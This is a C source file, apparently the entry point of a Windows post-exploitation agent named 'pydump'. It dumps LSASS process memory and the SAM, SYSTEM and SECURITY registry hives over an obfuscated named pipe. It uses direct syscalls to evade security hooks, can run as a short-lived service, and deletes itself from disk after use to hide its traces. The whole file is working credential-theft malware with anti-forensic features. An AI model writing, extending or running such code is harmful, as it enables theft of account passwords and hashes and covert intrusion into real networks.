/**
 * pydump agent — entry point. Zero kernel32/advapi32 dependencies.
 * Command line: agent.exe <MODE> <PID> <OUTPUT_NAME>
 *   mode & 4 = hive file reads (NtCreateFile + NtReadFile)
 *   mode & 2 = LSASS minidump
 *   mode & 1 = structured registry API reads (legacy)
 * Protocol: "PYD\x03" + registry section + LSASS MDMP.
 */

#include <windows.h>
#include "../include/syscalls.h"
#include "../include/agent.h"
#include "../include/registry.h"

/* ── Helpers ─────────────────────────────────────────────── */

static DWORD wtoi(const wchar_t *s) {
    DWORD val = 0;
    while (*s >= L'0' && *s <= L'9') {
        val = val * 10 + (*s - L'0');
        s++;
    }
    return val;
}

/* ── Self-delete via NtSetInformationFile ────────────────── */

static void self_delete(void) {
    PUNICODE_STRING img_path = get_image_path();
    if (!img_path || !img_path->Buffer || !img_path->Length) return;

    wchar_t nt_path[520];
    nt_path[0] = L'\\';
    nt_path[1] = L'?';
    nt_path[2] = L'?';
    nt_path[3] = L'\\';
    int off = 4;

    wchar_t *src = img_path->Buffer;
    USHORT src_chars = img_path->Length / sizeof(wchar_t);
    for (USHORT i = 0; i < src_chars && off < 518; i++) {
        nt_path[off++] = src[i];
    }
    nt_path[off] = L'\0';

    UNICODE_STRING us;
    us.Length = (USHORT)(off * sizeof(wchar_t));
    us.MaximumLength = (USHORT)((off + 1) * sizeof(wchar_t));
    us.Buffer = nt_path;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    HANDLE hFile = NULL;

    NTSTATUS status = sys_NtCreateFile(
        &hFile,
        0x00010000 | 0x00100000, /* DELETE | SYNCHRONIZE */
        &oa, &iosb, NULL, 0,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0
    );
    if (!NT_SUCCESS(status)) return;

    struct {
        BOOLEAN ReplaceIfExists;
        BYTE    pad[7];
        HANDLE  RootDirectory;
        ULONG   FileNameLength;
        WCHAR   FileName[2];
    } rename_info;
    rename_info.ReplaceIfExists = 0;
    rename_info.pad[0] = 0; rename_info.pad[1] = 0; rename_info.pad[2] = 0;
    rename_info.pad[3] = 0; rename_info.pad[4] = 0; rename_info.pad[5] = 0;
    rename_info.pad[6] = 0;
    rename_info.RootDirectory = NULL;
    rename_info.FileNameLength = 4;
    rename_info.FileName[0] = L':';
    rename_info.FileName[1] = L'x';

    status = sys_NtSetInformationFile(hFile, &iosb, &rename_info,
                                       sizeof(rename_info), FileRenameInformation);
    sys_NtClose(hFile);
    if (!NT_SUCCESS(status)) return;

    status = sys_NtCreateFile(
        &hFile,
        0x00010000 | 0x00100000, /* DELETE | SYNCHRONIZE */
        &oa, &iosb, NULL, 0,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0
    );
    if (!NT_SUCCESS(status)) return;

    FILE_DISPOSITION_INFORMATION disp;
    disp.DeleteFile = TRUE;
    sys_NtSetInformationFile(hFile, &iosb, &disp, sizeof(disp), FileDispositionInformation);
    sys_NtClose(hFile);
}

/* ── Service stub (mode 16) ──────────────────────────────── */

typedef BOOL (WINAPI *PFN_StartDispatcher)(PVOID);
typedef HANDLE (WINAPI *PFN_RegHandler)(LPCWSTR, PVOID);
typedef BOOL (WINAPI *PFN_SetSvcStatus)(HANDLE, PVOID);

typedef struct _SVC_STATUS {
    DWORD dwServiceType;
    DWORD dwCurrentState;
    DWORD dwControlsAccepted;
    DWORD dwWin32ExitCode;
    DWORD dwServiceSpecificExitCode;
    DWORD dwCheckPoint;
    DWORD dwWaitHint;
} SVC_STATUS;

static void WINAPI svc_ctrl_handler(DWORD ctrl) {
    (void)ctrl;
}

static void WINAPI svc_main(DWORD argc, LPWSTR *argv) {
    (void)argc; (void)argv;

    PFN_RegHandler reg = (PFN_RegHandler)g_addr.pfnRegHandler;
    PFN_SetSvcStatus set = (PFN_SetSvcStatus)g_addr.pfnSetStatus;

    wchar_t name[] = L"";
    HANDLE h = reg(name, svc_ctrl_handler);
    if (!h) return;

    /* Tell SCM we need time (avoids 30s connection timeout) */
    SVC_STATUS ss;
    ss.dwServiceType = 0x10;
    ss.dwCurrentState = 2;      /* SERVICE_START_PENDING */
    ss.dwControlsAccepted = 0;
    ss.dwWin32ExitCode = 0;
    ss.dwServiceSpecificExitCode = 0;
    ss.dwCheckPoint = 1;
    ss.dwWaitHint = 30000;
    set(h, &ss);

    /* Resolve syscalls inside START_PENDING (needs NtCreateFile etc.) */
    if (!resolve_syscalls()) {
        ss.dwCurrentState = 1;  /* SERVICE_STOPPED */
        ss.dwWin32ExitCode = 1;
        ss.dwCheckPoint = 0;
        ss.dwWaitHint = 0;
        set(h, &ss);
        return;
    }

    ss.dwCurrentState = 4;      /* SERVICE_RUNNING */
    ss.dwCheckPoint = 0;
    ss.dwWaitHint = 0;
    set(h, &ss);

    /* Write marker file to confirm SERVICE_RUNNING was reached */
    wchar_t marker_path[] = L"\\??\\C:\\Windows\\Temp\\_svcrun.tmp";
    UNICODE_STRING us_m;
    us_m.Buffer = marker_path;
    us_m.Length = 62;
    us_m.MaximumLength = 64;
    OBJECT_ATTRIBUTES oa_m;
    InitializeObjectAttributes(&oa_m, &us_m, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iosb_m;
    HANDLE hf = NULL;
    sys_NtCreateFile(&hf, 0x40110000, &oa_m, &iosb_m, NULL,
        0x80, 0, FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0);
    if (hf) sys_NtClose(hf);

    /* Brief delay so SCM records RUNNING */
    LARGE_INTEGER delay;
    delay.QuadPart = -5000000LL; /* 500ms */
    sys_NtDelayExecution(FALSE, &delay);

    sys_NtTerminateProcess((HANDLE)-1, 1);
}

static void run_as_service(void) {
    PFN_StartDispatcher start =
        (PFN_StartDispatcher)g_addr.pfnStartDispatcher;

    wchar_t name[] = L"";
    struct {
        LPWSTR lpName;
        PVOID  lpProc;
        LPWSTR lpName2;
        PVOID  lpProc2;
    } table;
    table.lpName = name;
    table.lpProc = svc_main;
    table.lpName2 = NULL;
    table.lpProc2 = NULL;

    start(&table);
}

/* ── Entry point ─────────────────────────────────────────── */

void main_entry(void) {
    PUNICODE_STRING cmdline_us = get_command_line();
    if (!cmdline_us || !cmdline_us->Buffer)
        return;

    wchar_t *p = cmdline_us->Buffer;

    /* Skip executable name */
    if (*p == L'"') {
        p++;
        while (*p && *p != L'"') p++;
        if (*p) p++;
    } else {
        while (*p && *p != L' ') p++;
    }
    while (*p == L' ') p++;

    /* Parse MODE */
    DWORD mode = wtoi(p);
    while (*p && *p != L' ') p++;
    while (*p == L' ') p++;

    /* Parse PID */
    DWORD pid = wtoi(p);
    while (*p && *p != L' ') p++;
    while (*p == L' ') p++;

    /* Output name */
    wchar_t *out_name = p;
    wchar_t *end = out_name;
    while (*end && *end != L' ' && *end != L'\r' && *end != L'\n') end++;
    *end = L'\0';

    if (mode == 0 || out_name[0] == L'\0')
        return;

    /* Service stub: connect to SCM ASAP, resolve SSNs inside START_PENDING */
    if (mode == 16) {
        if (!resolve_service_funcs())
            return;
        run_as_service();
        return;
    }

    if (!resolve_syscalls())
        return;

    /* Child mode: raw LSASS dump, no XOR, no PYD header */
    if (mode & 8) {
        HANDLE pipe = open_named_pipe(out_name);
        if (!pipe) { sys_NtTerminateProcess((HANDLE)-1, 3); return; }
        BOOL success = dump_lsass(pid, pipe);
        close_pipe(pipe);
        sys_NtTerminateProcess((HANDLE)-1, success ? 0 : 4);
        return;
    }

    HANDLE pipe = open_named_pipe(out_name);
    if (!pipe) {
        sys_NtTerminateProcess((HANDLE)-1, 3);
        return;
    }

    init_pipe_cipher(out_name);

    BYTE magic[4] = {'P', 'Y', 'D', 0x03};
    write_pipe(pipe, magic, 4);

    /* Registry: hive file reads (mode 4) or structured API reads (mode 1) */
    if (mode & 4) {
        init_registry();
        dump_hive_files(pipe);
    } else if (mode & 1) {
        init_registry();
        dump_registry_hives(pipe);
    } else {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4); /* system_len = 0 */
        write_pipe(pipe, &zero, 4); /* sam_len = 0 */
        write_pipe(pipe, &zero, 4); /* security_len = 0 */
    }

    /* LSASS minidump — direct dump (process must be local) */
    BOOL success = TRUE;
    if (mode & 2) {
        success = dump_lsass(pid, pipe);
    }

    close_pipe(pipe);
    self_delete();

    sys_NtTerminateProcess((HANDLE)-1, success ? 0 : 4);
}
